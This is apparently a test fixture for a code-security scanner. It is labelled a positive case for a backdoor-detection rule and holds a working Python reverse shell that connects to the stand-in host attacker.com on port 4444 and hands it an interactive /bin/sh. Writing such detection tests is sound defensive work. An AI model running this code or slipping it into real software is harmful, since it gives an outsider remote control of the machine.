# Test Case ID: BC-P01
# Rule: code_security.backdoor_code
# Test Type: positive
# Description: 包含反向 shell 后门代码
# Expected Detection: true
# Expected Severity: CRITICAL
# Code Type: vulnerable

import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
